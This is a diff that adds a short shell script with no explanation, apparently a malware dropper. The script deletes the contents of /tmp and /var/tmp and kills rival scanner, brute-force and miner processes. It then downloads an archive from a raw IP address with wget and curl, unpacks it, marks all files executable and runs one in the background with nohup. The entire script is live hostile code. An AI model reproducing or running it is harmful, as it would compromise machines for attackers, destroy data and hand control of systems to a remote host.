@@ -1,0 +1,19 @@
+rm -rf /tmp/* /tmp/.* &
+rm -rf /var/tmp/* /var/tmp/.* &
+cd /var/tmp/
+cd /tmp
+killall -9 scan brute f b r print pscan pnscan ps minerd &
+sleep 10
+wget http://109.228.25.87/.ips-80/cc.tar
+curl -O http://109.228.25.87/.ips-80/cc.tar
+sleep 5
+tar xvf cc.tar
+tar zxvf cc.tar
+tar xvf  cc.tar.1
+tar zxvf cc.tar.1
+tar xzvf cc.tar
+tar xzvf cc.tar.1
+sleep 10
+cd .cc
+chmod +x *
+nohup ./r &
